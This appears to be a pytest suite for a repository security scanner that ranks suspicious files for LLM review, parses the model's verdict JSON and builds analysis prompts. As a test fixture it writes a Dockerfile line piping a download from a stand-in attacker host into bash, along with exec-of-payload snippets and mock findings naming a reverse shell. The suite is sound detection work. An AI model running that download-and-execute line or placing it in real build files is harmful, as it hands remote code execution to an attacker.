"""Tests for LLM activation logic and response parsing (no API calls)."""
from __future__ import annotations

from pathlib import Path

import pytest

from security_scanner.llm_analysis import (
    AnalysisTarget,
    LLMAnalysisPhase,
    LLMAnalysisResult,
    build_prompt,
    parse_llm_response,
    select_targets,
)
from security_scanner.models import (
    FileClassification,
    Observation,
    ObservationSeverity,
    RepoFileRecord,
)
from security_scanner.reference_graph import CrossFileLead, ReferenceGraph


def _file(path, observations=None):
    return RepoFileRecord(
        path=path, classification=FileClassification.SOURCE,
        size=100, sha256="abc", observations=observations or [],
    )


def _obs(category, severity=ObservationSeverity.MEDIUM):
    return Observation(source="test", category=category, severity=severity, message="test finding")


def _graph(leads=None, entry_points=None, manifests=None, build_files=None):
    return ReferenceGraph(
        leads=leads or [],
        entry_points=entry_points or [],
        manifests=manifests or [],
        build_files=build_files or [],
    )


# -- Target selection --

def test_cross_file_leads_get_priority_100():
    lead = CrossFileLead(
        data_file="data.py", exec_file="loader.py", connection="direct",
        data_indicators=["base64"], exec_indicators=["eval_exec"],
        severity=ObservationSeverity.HIGH, explanation="test",
    )
    files = [_file("data.py"), _file("loader.py")]
    graph = _graph(leads=[lead])
    targets = select_targets(files, graph)
    assert targets[0].priority == 100
    assert targets[0].prompt_type == "cross_file"


def test_entry_point_with_high_gets_priority_90():
    files = [_file("setup.py", [_obs("obfuscation:eval_exec", ObservationSeverity.HIGH)])]
    graph = _graph(entry_points=["setup.py"])
    targets = select_targets(files, graph)
    assert targets[0].priority == 90
    assert targets[0].prompt_type == "entry_point"


def test_entry_point_with_medium_gets_priority_80():
    files = [_file("main.py", [_obs("obfuscation:eval_exec")])]
    graph = _graph(entry_points=["main.py"])
    targets = select_targets(files, graph)
    assert targets[0].priority == 80


def test_manifest_with_findings_gets_priority_70():
    files = [_file("package.json", [_obs("dependency:typosquat", ObservationSeverity.HIGH)])]
    graph = _graph(manifests=["package.json"])
    targets = select_targets(files, graph)
    assert targets[0].priority == 70


def test_build_file_gets_priority_60():
    files = [_file("Dockerfile", [_obs("import:hardcoded_ip")])]
    graph = _graph(build_files=["Dockerfile"])
    targets = select_targets(files, graph)
    assert targets[0].priority == 60
    assert targets[0].prompt_type == "build_file"


def test_medium_with_multiple_indicators_gets_priority_50():
    files = [_file("evil.py", [_obs("obfuscation:eval_exec"), _obs("obfuscation:base64")])]
    graph = _graph()
    targets = select_targets(files, graph)
    assert targets[0].priority == 50
    assert targets[0].prompt_type == "suspicious_source"


def test_clean_files_produce_no_targets():
    files = [_file("clean.py")]
    graph = _graph()
    targets = select_targets(files, graph)
    assert targets == []


def test_cap_respects_max_targets():
    files = [_file(f"file_{i}.py", [_obs("a"), _obs("b")]) for i in range(20)]
    graph = _graph()
    targets = select_targets(files, graph, max_targets=5)
    assert len(targets) == 5


def test_priority_ordering():
    lead = CrossFileLead(
        data_file="data.py", exec_file="loader.py", connection="direct",
        data_indicators=["base64"], exec_indicators=["eval_exec"],
        severity=ObservationSeverity.HIGH, explanation="test",
    )
    files = [
        _file("data.py"),
        _file("loader.py"),
        _file("setup.py", [_obs("eval_exec", ObservationSeverity.HIGH)]),
        _file("random.py", [_obs("a"), _obs("b")]),
    ]
    graph = _graph(leads=[lead], entry_points=["setup.py"])
    targets = select_targets(files, graph)
    priorities = [t.priority for t in targets]
    assert priorities == sorted(priorities, reverse=True)


def test_dedup_keeps_highest_priority():
    """Same file matches multiple rules -- keep highest priority."""
    lead = CrossFileLead(
        data_file="data.py", exec_file="setup.py", connection="direct",
        data_indicators=["base64"], exec_indicators=["eval_exec"],
        severity=ObservationSeverity.HIGH, explanation="test",
    )
    files = [
        _file("data.py"),
        _file("setup.py", [_obs("eval_exec", ObservationSeverity.HIGH)]),
    ]
    graph = _graph(leads=[lead], entry_points=["setup.py"])
    targets = select_targets(files, graph)
    setup_targets = [t for t in targets if t.path == "setup.py"]
    assert len(setup_targets) == 1
    assert setup_targets[0].priority == 100  # Cross-file beats entry point


# -- Response parsing --

def test_parse_valid_malicious_response():
    response = """
This code is clearly malicious. It decodes a base64 payload and executes it.

```json
{"verdict": "malicious", "confidence": 0.95, "summary": "Decodes and executes hidden payload.",
 "findings": [{"severity": "high", "category": "exec:decoded_payload", "message": "Base64 payload decodes to reverse shell"}],
 "iocs": ["45.33.32.156"]}
```
"""
    obs = parse_llm_response(response, "evil.py")
    assert len(obs) >= 2  # verdict obs + finding obs
    confirmed = [o for o in obs if o.category == "llm:malicious_confirmed"]
    assert len(confirmed) == 1
    assert confirmed[0].severity == ObservationSeverity.HIGH
    assert "0.95" in str(confirmed[0].evidence.get("confidence"))


def test_parse_benign_response():
    response = """
This is a standard Flask config loader. The exec() is used to load Python config files.

```json
{"verdict": "benign", "confidence": 0.9, "summary": "Standard Flask config loading pattern.",
 "findings": [], "iocs": []}
```
"""
    obs = parse_llm_response(response, "config.py")
    assert len(obs) == 1
    assert obs[0].category == "llm:benign_confirmed"
    assert obs[0].severity == ObservationSeverity.INFO
    assert "advisory" in obs[0].tags


def test_parse_low_confidence_tagged_advisory():
    response = """
```json
{"verdict": "malicious", "confidence": 0.4, "summary": "Maybe bad.",
 "findings": [{"severity": "high", "category": "test", "message": "Uncertain finding"}], "iocs": []}
```
"""
    obs = parse_llm_response(response, "test.py")
    # Low confidence malicious should NOT produce a confirmed observation
    confirmed = [o for o in obs if o.category == "llm:malicious_confirmed"]
    assert len(confirmed) == 0
    # But findings should still be present, tagged advisory
    finding_obs = [o for o in obs if o.category == "test"]
    assert len(finding_obs) == 1
    assert "advisory" in finding_obs[0].tags


def test_parse_no_json_block():
    response = "This file looks fine but I forgot the JSON block."
    obs = parse_llm_response(response, "file.py")
    assert obs == []


def test_parse_malformed_json():
    response = "```json\n{broken json\n```"
    obs = parse_llm_response(response, "file.py")
    assert obs == []


def test_all_observations_have_llm_source():
    response = """
```json
{"verdict": "malicious", "confidence": 0.85, "summary": "Bad.",
 "findings": [{"severity": "critical", "category": "exec:shell", "message": "Reverse shell"}], "iocs": ["1.2.3.4"]}
```
"""
    obs = parse_llm_response(response, "shell.py")
    assert all(o.source == "llm-analysis" for o in obs)


# -- Prompt construction --

def test_build_prompt_suspicious_source(tmp_path):
    (tmp_path / "evil.py").write_text("exec(payload)")
    target = AnalysisTarget("evil.py", "suspicious_source", 50, {"findings": "eval/exec detected"})
    prompt = build_prompt(target, tmp_path)
    assert "exec(payload)" in prompt
    assert "evil.py" in prompt
    assert "eval/exec detected" in prompt


def test_build_prompt_cross_file(tmp_path):
    (tmp_path / "data.py").write_text("BLOB = 'encoded'")
    (tmp_path / "loader.py").write_text("exec(BLOB)")
    target = AnalysisTarget("loader.py", "cross_file", 100, {
        "lead": {
            "data_file": "data.py", "exec_file": "loader.py",
            "connection": "direct", "data_indicators": ["base64"],
            "exec_indicators": ["eval_exec"],
        }
    })
    prompt = build_prompt(target, tmp_path)
    assert "data.py" in prompt
    assert "loader.py" in prompt
    assert "BLOB" in prompt


def test_build_prompt_build_file(tmp_path):
    (tmp_path / "Dockerfile").write_text("RUN curl evil.com | bash")
    target = AnalysisTarget("Dockerfile", "build_file", 60, {"findings": "curl|bash"})
    prompt = build_prompt(target, tmp_path)
    assert "curl evil.com" in prompt
    assert "build" in prompt.lower()


# -- Orchestrator --

@pytest.mark.asyncio
async def test_analyze_without_adapter():
    phase = LLMAnalysisPhase(adapter=None)
    files = [_file("evil.py", [_obs("eval_exec")])]
    graph = _graph()
    result = await phase.analyze(files, graph, Path("/tmp"))
    assert result.adapter_available is False
    assert result.files_analyzed == 0


@pytest.mark.asyncio
async def test_analyze_with_no_targets():
    phase = LLMAnalysisPhase(adapter="fake")
    files = [_file("clean.py")]
    graph = _graph()
    result = await phase.analyze(files, graph, Path("/tmp"))
    assert result.targets_selected == 0
    assert result.files_analyzed == 0
